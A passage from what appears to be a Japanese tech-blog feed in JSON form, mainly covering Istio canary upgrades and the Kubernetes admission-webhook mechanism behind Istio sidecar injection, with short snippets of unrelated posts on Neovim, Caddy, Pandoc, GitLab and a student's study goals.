があります。kubectl rollout restartコマンドを実行し、barのistio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment bar -n bar再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'bar-app:1.0 # マイクロサービスdocker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47(6) ユーザの手を借りたテストここで実施することIstioを部分的にアップグレードしたところで、アップグレードが完了したNamespaceをテストします。ユーザーの手を借りて実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。今の状況は以下の通りです\uD83D\uDC47もし問題が起こった場合もし問題が起こった場合、1-14-6にダウングレードしていきます。istioctl tag setコマンドを実行し、istio.io/revラベルの値を元に戻します。$ istioctl tag set default --revision 1-14-6 --overwriteその後、kubectl rollout restartコマンドの手順を実行し、istio-proxyコンテナをダウングレードしてきます。(7) istio-proxyコンテナの段階的アップグレードここで実施すること先ほどのNamespaceで問題が起こらなければ、残ったNamespace (foo、baz、...) のistio-proxyコンテナも段階的にアップグレードしていきます。kubectl rollout restartコマンド同様にkubectl rollout restartコマンドを実行し、istio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment foo -n foo$ kubectl rollout restart deployment baz -n baz...最終的に、全てのNamespacemのistio-proxyコンテナが新しくなります。今の状況は以下の通りです\uD83D\uDC47(8) 旧Istiodのアンインストールここで実施すること最後に、旧Istiodのアンインストールします。Uninstall old control planeistioctl uninstallコマンドistioctl uninstallコマンドを実行し、旧Istiodをアンインストールします。$ istioctl uninstall --revision 1-14-6✅ Uninstall complete今の状況は以下の通りです\uD83D\uDC47kubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl uninstallコマンドで何をアンインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6というDeploymentが無くなっています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-15-4   1/1     1            1           47s # 1-15-4▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-14-6というServiceが無くなっています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-14-6というMutatingWebhookConfigurationが無くなっています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # 次のカナリアアップグレードでも使用するistio-sidecar-injector-1-15-4   2          2m16sこれで、新Istiodに完全に入れ替わったため、アップグレードは完了です。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて06. おわりにIstioを安全にアップグレードするカナリア方式とその仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。これからIstioを採用予定の方は、Istioを安全にアップグレードするために十分に準備しておくことをお勧めします\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2023-02-26T11:25:48.000Z","dateMiliSeconds":1677410748000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"LINE に送ったメッセージを Google Home に読み上げさせる","link":"https://blog.1q77.com/2023/02/line-bot-tts/","contentSnippet":"令和の時代、家に固定電話はなく、外出先から家族に直ぐに答えて欲しいことがあってもスマホはマナーモードで手元に置いてなければ気づくことができません。","isoDate":"2023-02-25T12:51:58.000Z","dateMiliSeconds":1677329518000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Caddy の Internal TLS 証明書の有効期間を指定する","link":"https://blog.1q77.com/2023/02/caddy-internal-tls-cert-lifetime/","contentSnippet":"以前 ワンライナーで https の Reverse Proxy を実行する という記事で Caddy を使うと local での開発用に任意のドメインの証明書を簡単に発行できるし CA の証明書も OS の証明書ストアに保存してくれるため、ブラウザでアクセスしても警告が出なくて便利というのを書きました。","isoDate":"2023-02-09T14:29:32.000Z","dateMiliSeconds":1675952972000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"NeovimのターミナルをExコマンド実行環境化する","link":"https://blog.atusy.net/2023/02/02/zsh-as-nvim-cmdline/","contentSnippet":"Neovim内に開いたTerminalで:から始まる文字列を入力すると、Neovimで実行した結果を表示する仕組みを作ってみました。","isoDate":"2023-02-02T00:00:00.000Z","dateMiliSeconds":1675296000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"2023年の目標","link":"https://moz-security.hatenablog.com/entry/2023/02/01/112627","contentSnippet":"前回のブログで「近々、新年の抱負として、今年やりたいことを書きたいと思っています。」と書いておきながら、もう少しで１ヶ月が経ってしまいます。（近々とは？って感じですけど 笑）１月は、大学のテストと溜まりに溜まった課題で手一杯でしたが、1月31日でそれも終わり、ひと段落したため、今年の目標について書いていこうと思います。目標は大きく4つあります。1つ目は、大学の研究です。これは目標というよりも、頑張ることになってますね。どれだけ独学で勉強しても、趣味でいろいろシステム開発しても、まずは大学を卒業しなければ、学士にはなれないため、これは間違いなく最優先で行わなければいけません。大学の授業としても、あと残っているのが卒業研究だけであるため、今年大学でやること・頑張ることはこれだけかなと思います。大学に行って、ひたすら研究、研究、研究になる気がします。2つ目は、Hack The BoxでHackerランクになることです。昨年の3月ごろからHack The Boxを始めて、時間があるときに取り組んでいましたが、Starting Pointのいろいろな箇所で詰まったり、そもそも時間を十分に取れなかったりして、あまり攻略できていませんでした。今年は、授業もあまりなく、時間も取れそうなため、本腰を入れて頑張りたいと思います。具体的な数字でいうと、少なくとも毎日１時間、朝８時〜９時までをHack The Boxを攻略する時間に当てようと思っています。理想は、2時間、3時間、時間が取れるならそれよりもという感じなんですけど、日によっては、忙しい日もあるので、そんな日でも取れそうな最低限の1時間にしました。こういうのは1日に頑張りすぎるよりも、継続することが大事だと思うので、毎日コツコツやっていきたいと思います。将来的にはセキュリティ関連の仕事をしたいため、攻撃を通して防御を学び、防御を通して攻撃を学んでいきたいと思います。3つ目は、資格の取得です。今まで、基本情報技術者、応用情報技術者を取ってきたため、今年は、情報処理安全確保支援士に挑戦したいと思っています。資格は、知識問題でしかないから、社会では使えないという意見もあり、自分でも知識(知っていること) とスキル(できること)は違うと思っているため、半分は同意できるのですが、一方で、資格を取るために勉強するというこの資格を取るまでの過程が大事だとも思っています。また、幅広く体系的な知識を習得できるというのも資格取得のメリットだと思っています。情報処理安全確保支援士取得に向けて、これから頑張りたいと思います。4つ目は、学外のイベントに参加することです。セキュリティキャンプやSecHack365といったセキュリティ関連のイベントに加え、ハッカソンやカンファレンスにも参加していきたいと思っています。前までは、自分のスキルでは学外イベントに参加するのは恥ずかしいと思い、挑戦できていなかったのですが、昨年、ハッカソンやセキュリティ・ミニキャンプに参加することで、参加する人全員がすごい人ではなく、自分と似たような人もいるし、イベントを通して、成長したいという人がたくさんいることも知りました。今年は、昨年に引き続き、より多くのイベントに参加し、成長できる環境に自分から臨んでいきたいと思います。1月も終わり、今年もあと11ヶ月になりましたが、いろいろな経験をして、たくさんの人に出会い、成長できたと言える1年にしていきたいと思います。","isoDate":"2023-02-01T02:26:27.000Z","dateMiliSeconds":1675218387000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"PandocのLuaフィルタ内で引用文献を処理するpandoc.utils.citeprocを試す","link":"https://blog.atusy.net/2023/01/31/pandoc-citeproc-lua/","contentSnippet":"Pandocで引用文献を処理する方法として、--citeproc引数と--lua-filter引数を使う場合を比較。 後者ではpandoc.utils.citeproc関数を利用。 Luaフィルタを使うとASTレベルで引用文献を処理するので、更にフィルタをかけたい場合に便利。 ただし、--citeproc引数と併用すると引用文献のリストを2回繰り返すので排他利用を推奨。","isoDate":"2023-01-31T00:00:00.000Z","dateMiliSeconds":1675123200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"GitLabで指定したグループ内の全てのリポジトリを一括でcloneする","link":"https://zenn.dev/tayusa/articles/ae5911391c9440","contentSnippet":"概要1個1個丹精込めて手動でcloneすることに限界を感じたので、一括で自分に関連するリポジトリをcloneする シェルスクリプト.zshrc# リポジトリのディレクトリを作成してからcloneする# 第1引数 URL(https://gitlab.example.com/diaspora/diaspora-client.git)function git_clone_to_path() {  [[ -z ${commands[git]} ]] \\\\    && { echo \'git is required\'; return 1; }  loca...","isoDate":"2023-01-29T17:07:31.000Z","dateMiliSeconds":1675012051000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Neovimのテキストオブジェクトをカスタムできるmini.aiが便利","link":"https://blog.atusy.net/2023/01/27/mini-ai-nvim/","contentSnippet":"Mini.aiについてテキストオブジェクトを自作するi[で[ foo ]の両端のスペースを含めた範囲を選択するa]で[[ foo ]]のような二重カッコを選択するaj]で「 foo 」のような日本語のカッコを選択するMini.aiについてVimやNeovimのテキストオブジェクト、便利ですよね。","isoDate":"2023-01-27T00:00:00.000Z","dateMiliSeconds":1674777600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ArtifactHUBについてのメモ","link":"https://zenn.dev/bells17/articles/artifacthub-note","contentSnippet":"ArtifactHUB というコンテナイメージHelm Chartなどを登録・検索することのできるツールを試してみたのでメモ。https://artifacthub.io/ ArtifactHUB についてコンテナイメージHelm Chartなどを「リポジトリ」として登録・検索することができるよう。登録できるリポジトリの種類は下記で確認できる。https://artifacthub.io/docs/topics/repositories/アカウント登録方法は現在下記の3つがあるemailgithubgoogle リポジトリの登録リポジトリ登...","isoDate":"2023-01-21T18:21:58.000Z","dateMiliSeconds":1674325318000,"authorName":"bells17","authorId":"bells17"},{"title":"container-structure-testによるコンテナのテスト","link":"https://zenn.dev/bells17/articles/container-structure-test","contentSnippet":"Googleが作成しているcontainer-structure-testというコンテナをテストするツールを試したのでメモ。かなり単純なツールなのでぶっちゃけREADMEに書いてあることを読めばわかるんだけど一応情報をまとめた。https://github.com/GoogleContainerTools/container-structure-testGoogleのブログで紹介されている記事はこちら。https://opensource.googleblog.com/2018/01/container-structure-tests-unit-tests.html cont...","isoDate":"2023-01-21T10:54:17.000Z","dateMiliSeconds":1674298457000,"authorName":"bells17","authorId":"bells17"},{"title":"【Istio⛵️】サービスメッシュの登場経緯とIstioサイドカーインジェクションの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/01/14/223815","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️代表的なサービスメッシュの種類についてIstioのサイドカーインジェクションの仕組みについてこの記事から得られる知識01. はじめに02. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかサービスメッシュのモデルサイドカープロキシメッシュ03. admission-controllersアドオンについてadmission-controllersアドオンとはadmissionプラグインの種類MutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはAdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReview▼ AdmissionRequest▼ AdmissionResponse04. サイドカーインジェクションの仕組み全体のフロークライアント ➡︎ kube-apiserverここで説明するフロー箇所(1) Podの作成をリクエストkube-apiserver ➡︎ Serviceここで説明するフロー箇所(2) 認証/認可処理をコール(3) アドオンの処理をコール(4) AdmissionRequestに値を詰める(5) AdmissionReviewを送信Service ➡︎ webhookサーバーここで説明するフロー箇所(6) 15017番ポートにポートフォワーディングkube-apiserver ⬅︎ Service ⬅︎ webhookサーバー (※逆向きの矢印)ここで説明するフロー箇所(7) patch処理を定義(8) AdmissionResponseに値を詰める(9) AdmissionReviewを返信kube-apiserver ➡︎ etcdここで説明するフロー箇所(10) patch処理をコール(11) マニフェストを永続化クライアント ⬅︎ kube-apiserverここで説明するフロー箇所(12) コール完了を返信以降の仕組み05. おわりに記事関連のおすすめ書籍01. はじめに推し (Istio) が尊い\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4Fさて、前回の記事の時と同様に、最近の業務でもオンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、サービスメッシュを実装するIstioサイドカーインジェクションを記事で解説しました。解説するのは、執筆時点 (2023/01/14) 時点で最新の 1.14 系のIstioです。執筆時点 (2023/01/14) では、Istioが実装するサービメッシュには、『サイドカープロキシメッシュ』と『アンビエントメッシュ』があります。サイドカープロキシメッシュの仕組みの軸になっているものは、サイドカーコンテナであるistio-proxyコンテナです。Istioは、KubernetesのPodの作成時に、istio-proxyコンテナをPod内に自動的にインジェクション (注入) しますそれでは、もりもり布教していきます\uD83D\uDE1702. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかそもそも、なぜサービスメッシュが登場したのでしょうか。マイクロサービスアーキテクチャのシステムには、アーキテクチャ固有のインフラ領域の問題 (例：サービスディスカバリーの必要性、マイクロサービス間通信の暗号化、テレメトリー作成など) があります。アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装すれば、これらの問題の解決できます。しかし、アプリエンジニアはアプリ領域の問題に責務を持ち、インフラ領域の問題はインフラエンジニアで解決するようにした方が、互いに効率的に開発できます。そこで、インフラ領域の問題を解決するロジックをサイドカーとして切り分けます。これにより、アプリエンジニアとインフラエンジニアの責務を分離可能になり、凝集度が高くなります。また、インフラ領域の共通ロジックをサイドカーとして各マイクロサービスに提供できるため、単純性が高まります。こういった流れの中で、サービスメッシュが登場しました。servicemesh.es | Service Mesh ComparisonWhat is Service Mesh and why is it needed in Kubernetes?サービスメッシュのモデル前述の通り、サービスメッシュの登場前は、アプリエンジニアが各マイクロサービス内にインフラ領域の問題に関するロジックを実装していました。これを、『共有ライブラリモデル』と呼びます。その後、『サイドカーモデル』とも呼ばれるサイドカープロキシメッシュが登場しました。執筆時点 (2023/01/14) では、『カーネルモデル』とも呼ばれるサイドカーフリーメッシュが登場しています。サイドカープロキシメッシュIstioのサイドカーによるサービスメッシュ (サイドカープロキシメッシュ) は、サイドカーコンテナ (istio-proxyコンテナ) が稼働するデータプレーンサイドカーを中央集権的に管理するIstiod (discoveryコンテナ) が稼働するコントロールプレーンからなります。Istio / Architecture03. admission-controllersアドオンについてadmission-controllersアドオンとはIstioのPod内へのサイドカーインジェクションの前提知識として、admission-controllersアドオンを理解する必要があります。もし、admission-controllersアドオンをご存知の方は、 04. サイドカーインジェクションの仕組み まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍kube-apiserverでは、admission-controllersアドオンを有効化できます。有効化すると、認証ステップと認可ステップの後にmutating-admissionステップとvalidating-admissionステップを実行でき、admissionプラグインの種類に応じた処理を挿入できます。クライアント (kubectlクライアント、Kubernetesリソース) からのリクエスト (例：Kubernetesリソースに対する作成/更新/削除、kube-apiserverからのプロキシへの転送) 時に、各ステップでadmissionプラグインによる処理 (例：アドオンビルトイン処理、独自処理) を発火させられます。Admission Control in Kubernetes | KubernetesKubernetes Best Practices: Blueprints for Building Successful Applications on Kubernetesadmissionプラグインの種類admission-controllersアドオンのadmissionプラグインには、たくさんの種類があります。IstioがPod内にサイドカーをインジェクションする時に使用しているアドオンは、『MutatingAdmissionWebhook』です。CertificateApprovalCertificateSigningCertificateSubjectRestrictionDefaultIngressClassDefaultStorageClassDefaultTolerationSecondsLimitRanger\\"MutatingAdmissionWebhook\\" \uD83D\uDC48 これNamespaceLifecyclePersistentVolumeClaimResizePodSecurityPriorityResourceQuotaRuntimeClassServiceAccountStorageObjectInUseProtectionTaintNodesByConditionValidatingAdmissionWebhookAdmission Control in Kubernetes | KubernetesMutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはMutatingAdmissionWebhookプラグインを使用すると、mutating-admissionステップ時に、リクエスト内容を変更する処理をフックできます。フックする具体的な処理として、webhookサーバーにAdmissionRequestリクエストとして送信することにより、レスポンスのAdmissionResponseに応じてリクエスト内容を動的に変更します。MutatingWebhookConfigurationで、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を設定します。MutatingWebhookConfigurationの具体的な実装については、サイドカーインジェクションの仕組みの中で説明していきます。Diving into Kubernetes MutatingAdmissionWebhook | by Morven Cao | IBM Cloud | MediumKubernetes Admission Webhook覚書き - gashirar\'s blogAdmission Webhookを作って遊んで、その仕組みを理解しよう（説明編）AdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReviewAdmissionReviewは以下のようなJSONであり、kube-apiserverとwebhookサーバーの間でAdmissionRequestとAdmissionResponseを運びます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {},  # AdmissionResponse  \\"response\\": {},}v1 package - k8s.io/api/admission/v1 - Go Packages▼ AdmissionRequestAdmissionRequestは以下のようなJSONです。kube-apiserverがクライアントから受信した操作内容が持つことがわかります。例で挙げたAdmissionRequestでは、クライアントがDeploymentをCREATE操作するリクエストをkube-apiserverに送信したことがわかります。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"apps\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"deployments\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}Dynamic Admission Control | Kubernetes▼ AdmissionResponse一方でAdmissionResponseは、例えば以下のようなJSONです。AdmissionResponseは、マニフェスト変更処理をpatchキーの値に持ち、これはbase64方式でエンコードされています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"<value from request.uid>\\",      # 宛先のwebhookサーバーが受信したか否かを表す。      \\"allowed\\": true,      # PathによるPatch処理を行う。      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"W3sib3AiOiAiYWRkIiwgInBhdGgiOiAiL3NwZWMvcmVwbGljYXMiLCAidmFsdWUiOiAzfV0=\\",    },}エンコード値をデコードしてみると、例えば以下のようなpatch処理が定義されています。# patchキーをbase64方式でデコードした場合[{\\"op\\": \\"add\\", \\"path\\": \\"/spec/replicas\\", \\"value\\": 3}]マニフェストに対する操作 (op) 、キー (path) 、値 (value) が設定されています。kube-apiserverがこれを受信すると、指定されたキー (.spec.replicas) に値 (3) に追加します。Dynamic Admission Control | Kubernetes04. サイドカーインジェクションの仕組み全体のフロー前提知識を踏まえた上で、admission-controllersアドオンの仕組みの中で、サイドカーのistio-proxyコンテナがどのようにPodにインジェクションされるのかを見ていきましょう。最初に、サイドカーインジェクションのフローは以下の通りになっています。(画像はタブ開き閲覧を推奨)Istio in Action (English Edition)クライアント ➡︎ kube-apiserverここで説明するフロー箇所『クライアント ➡︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(1) Podの作成をリクエストまずは、クライアントがkube-apiserverにリクエストを送信するところです。クライアント (Deployment、DaemonSet、StatefulSet、を含む) は、Podの作成リクエストをkube-apiserverに送信します。この時のリクエスト内容は、以下の通りとします。# Podを作成する。$ kubectl apply -f foo-pod.yaml# foo-pod.yamlファイルapiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80またNamespaceでは、あらかじめistio-proxyコンテナのインジェクションが有効化されているとします。Istioではv1.10以降、リビジョンの番号のエイリアスを使用して、istio-proxyコンテナのインジェクションを有効化するようになりました。apiVersion: v1kind: Namespacemetadata:  name: foo-namespace  labels:    # istio-proxyコンテナのインジェクションを有効化する。    # エイリアスは自由    istio.io/rev: <エイリアス>Istio / Announcing Support for 1.8 to 1.10 Direct Upgrades▶ istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dkube-apiserver ➡︎ Serviceここで説明するフロー箇所『kube-apiserver ➡︎ Service』の箇所を説明します。(画像はタブ開き閲覧を推奨)(2) 認証/認可処理をコールkube-apiserverは、認証ステップと認可ステップにて、クライアントからのリクエストを許可します。(3) アドオンの処理をコールkube-apiserverは、mutating-admissionステップにて、MutatingAdmissionWebhookプラグインの処理をコールします。前提知識の部分で具体的な実装を省略しましたが、Istioのバージョン1.14.3時点で、MutatingWebhookConfigurationは以下のようになっています。Namespaceでサイドカーインジェクションを有効化する時に使用したエイリアスは、このMutatingWebhookConfigurationで実体のリビジョン番号と紐づいています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yamlapiVersion: admissionregistration.k8s.io/v1beta1kind: MutatingWebhookConfigurationmetadata:  name: istio-revision-tag-default  labels:    app: sidecar-injector    # エイリアスの実体    istio.io/rev: <リビジョン番号>    # リビジョン番号のエイリアス    istio.io/tag: <エイリアス>webhooks:  - name: rev.namespace.sidecar-injector.istio.io    # MutatingAdmissionWebhookプラグインの処理の発火条件を登録する。    rules:      - apiGroups: [\\"\\"]        apiVersions: [\\"v1\\"]        operations: [\\"CREATE\\"]        resources: [\\"pods\\"]        scope: \\"*\\"    # Webhookの前段にあるServiceの情報を登録する。    clientConfig:      service:        name: istiod-<リビジョン番号>        namespace: istio-system        path: \\"/inject\\" # エンドポイント        port: 443      caBundle: Ci0tLS0tQk ...    # Namespace単位のサイドカーインジェクション    # 特定のNamespaceでMutatingAdmissionWebhookプラグインの処理を発火させる。    namespaceSelector:      matchExpressions:        - key: istio.io/rev          operator: DoesNotExist        - key: istio-injection          operator: DoesNotExist    # Pod単位のサイドカーインジェクション    # 特定のオブジェクトでMutatingAdmissionWebhookプラグインの処理を発火させる。    objectSelector:      matchExpressions:        - key: sidecar.istio.io/inject          operator: NotIn          values:            - \\"false\\"        - key: istio.io/rev          operator: In          values:            - <エイリアス>    ...MutatingWebhookConfigurationには、MutatingAdmissionWebhookプラグインの発火条件やwebhookサーバーの宛先情報を定義します。MutatingAdmissionWebhookプラグインの発火条件に関して、例えばIstioでは、 NamespaceやPod.metadata.labelsキーに応じてサイドカーインジェクションの有効化/無効化を切り替えることができ、これをMutatingAdmissionWebhookプラグインで制御しています。webhookサーバーの宛先情報に関して、Istioではwebhookサーバーの前段にServiceを配置しています。MutatingAdmissionWebhookプラグインが発火した場合、Serviceの/inject:443にHTTPSプロトコルのリクエストを送信するようになっています。また、宛先のServiceの名前がistiod-<リビジョン番号>となっていることからもわかるように、Serviceは特定のバージョンのIstiodコントロールプレーンに対応しており、想定外のバージョンのIstiodコントロールプレーンを指定しないように制御しています。一方で発火しなかった場合には、以降のAdmissionReviewの処理には進みません。(4) AdmissionRequestに値を詰めるkube-apiserverは、mutating-admissionステップにて、クライアントからのリクエスト内容 (Podの作成リクエスト) をAdmissionReveiew構造体のAdmissionRequestに詰めます。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionRequest  \\"request\\": {    ...    # 変更されるKubernetesリソースの種類を表す。    \\"resource\\": {      \\"group\\": \\"core\\",      \\"version\\": \\"v1\\",      \\"resource\\": \\"pods\\"    },    # kube-apiserverの操作の種類を表す。    \\"operation\\": \\"CREATE\\",    ...  }}(5) AdmissionReviewを送信kube-apiserverは、mutating-admissionステップにて、Serviceの/inject:443にAdmissionReview構造体を送信します。Service ➡︎ webhookサーバーここで説明するフロー箇所『Service ➡︎ webhookサーバー』の箇所を説明します。(画像はタブ開き閲覧を推奨)(6) 15017番ポートにポートフォワーディングServiceは、/inject:443でリクエストを受信し、discoveryコンテナの15017番ポートにポートフォワーディングします。Istioのバージョン1.14.3時点で、Serviceは以下のようになっています。$ kubectl get svc istiod-service -n istio-system -o yamlapiVersion: v1kind: Servicemetadata:  labels:    app: istiod  name: istiod-<リビジョン番号>  namespace: istio-systemspec:  type: ClusterIP  selector:    app: istiod    istio.io/rev: <リビジョン番号>  ports:    - name: grpc-xds      port: 15010      protocol: TCP      targetPort: 15010    - name: https-dns      port: 15012      protocol: TCP      targetPort: 15012    # webhookサーバーにポートフォワーディングする。    - name: https-webhook      port: 443      protocol: TCP      targetPort: 15017    - name: http-monitoring      port: 15014      protocol: TCP      targetPort: 15014.spec.selector.istio.io/revキーに、ポートフォワーディング先のPodを指定するためのリビジョン番号が設定されており、このPodはdiscoveryコンテナを持ちます。Istioは、discoveryコンテナ内でwebhookサーバーを実行し、15017番ポートでリクエストを待ち受けます。▶ istio.io/rev`discovery`コンテナの待ち受けポートについてdiscoveryコンテナがリクエストを待ち受けているポート番号を見てみると、15017番ポートでリッスンしていることを確認できます\uD83D\uDC4D$ kubectl exec foo-istiod -n istio-system -- netstat -tulpnActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program nametcp        0      0 127.0.0.1:9876          0.0.0.0:*               LISTEN      1/pilot-discoverytcp6       0      0 :::15017                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::8080                 :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15010                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15012                :::*                    LISTEN      1/pilot-discoverytcp6       0      0 :::15014                :::*                    LISTEN      1/pilot-discoveryistio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubhttps://istio.io/latest/docs/ops/deployment/requirements/#ports-used-by-istiokube-apiserver ⬅︎ Service ⬅︎ webhookサーバー (※逆向きの矢印)ここで説明するフロー箇所『kube-apiserver ⬅︎ Service ⬅︎ webhookサーバー』の箇所を説明します。矢印が逆向きなことに注意してください。(画像はタブ開き閲覧を推奨)(7) patch処理を定義仕組みの中でも、ここは重要な部分です。discoveryコンテナ内のwebhookサーバーは、リクエスト内容を書き換えるためのpatch処理を定義します。webhookサーバーは、マニフェストの.spec.containers[1]パスにistio-proxyキーを追加させるようなpatch処理を定義します。この定義によって、結果的にサイドカーのインジェクションが起こるということになります。[  ...  {    \\"op\\": \\"add\\",    # .spec.initContainers[1] を指定する。    \\"path\\": \\"/spec/initContainers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-init\\",      \\"resources\\": {                     ...      }    }  },  {    \\"op\\": \\"add\\",    # .spec.containers[1] を指定する。    \\"path\\": \\"/spec/containers/1\\",    # マニフェストに追加される構造を表す。    \\"value\\": {      \\"name\\": \\"istio-proxy\\",      \\"resources\\": {                     ...      }    }  }  ...]istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHubistio/pkg/kube/inject/webhook_test.go at 1.14.3 \xb7 istio/istio \xb7 GitHubこの時、サイドカーのテンプレートに割り当てられた値が、patch処理を内容を決めます。type SidecarTemplateData struct {    TypeMeta             metav1.TypeMeta    DeploymentMeta       metav1.ObjectMeta    ObjectMeta           metav1.ObjectMeta    Spec                 corev1.PodSpec    ProxyConfig          *meshconfig.ProxyConfig    MeshConfig           *meshconfig.MeshConfig    Values               map[string]interface{}    Revision             string    EstimatedConcurrency int    ProxyImage           string}...istio/pkg/kube/inject/inject.go at 1.14.3 \xb7 istio/istio \xb7 GitHub▶ patch処理でインジェクションするコンテナについてistio-proxyコンテナの他に、InitContainerのistio-initコンテナもインジェクション可能にします。このistio-initコンテナは、Pod内にiptablesのルールを適用し、Podのインバウンド通信／アウトバウンド通信をistio-proxyコンテナにリダイレクトさせる責務を担います\uD83D\uDCAA\uD83C\uDFFBIstio Sidecar\'s interception mechanism for traffic - SoByte(8) AdmissionResponseに値を詰めるdiscoveryコンテナ内のwebhookサーバーは、patch処理の定義をAdmissionReveiew構造体のAdmissionResponseに詰めます。patchキーの値に、先ほどのpatch処理の定義をbase64方式でエンコードした文字列が割り当てられています。{  \\"apiVersion\\": \\"admission.k8s.io/v1\\",  \\"kind\\": \\"AdmissionReview\\",  # AdmissionResponse  \\"response\\": {      \\"uid\\": \\"*****\\",      \\"allowed\\": true,      \\"patchType\\": \\"JSONPatch\\",      # Patch処理の対象となるKubernetesリソースと処理内容を表す。base64方式でエンコードされている。      \\"patch\\": \\"<先ほどのpatch処理の定義をbase64方式でエンコードした文字列>\\",    },}istio/pkg/kube/inject/webhook.go at 1.14.3 \xb7 istio/istio \xb7 GitHub(9) AdmissionReviewを返信discoveryコンテナ内のwebhookサーバーは、AdmissionReview構造体をレスポンスとしてkube-apiserverに返信します。kube-apiserver ➡︎ etcdここで説明するフロー箇所『kube-apiserver ➡︎ etcd』の箇所を説明します。(画像はタブ開き閲覧を推奨)(10) patch処理をコールkube-apiserverは、AdmissionReview構造体を受信し、AdmissionResponseに応じてリクエスト内容を書き換えます。patch処理の定義をAdmissionReview構造体から取り出し、クライアントからのリクエスト内容を書き換えます。具体的には、istio-proxyコンテナとistio-initコンテナを作成するために、リクエストしたマニフェストの該当箇所にキーを追加します。apiVersion: v1kind: Podmetadata:  name: foo-pod  namespace: foo-namespacespec:  containers:    - name: foo      image: foo:1.0.0      ports:        - containerPort: 80    # kube-apiserverが追加    - name: istio-proxy      ...  # kube-apiserverが追加  initContainers:    - name: istio-init    ...(11) マニフェストを永続化kube-apiserverは、etcdにPodのマニフェストを永続化します。クライアント ⬅︎ kube-apiserverここで説明するフロー箇所『クライアント ⬅︎ kube-apiserver』の箇所を説明します。(画像はタブ開き閲覧を推奨)(12) コール完了を返信kube-apiserverは、クライアントにレスポンスを受信します。$ kubectl apply -f foo-pod.yaml# 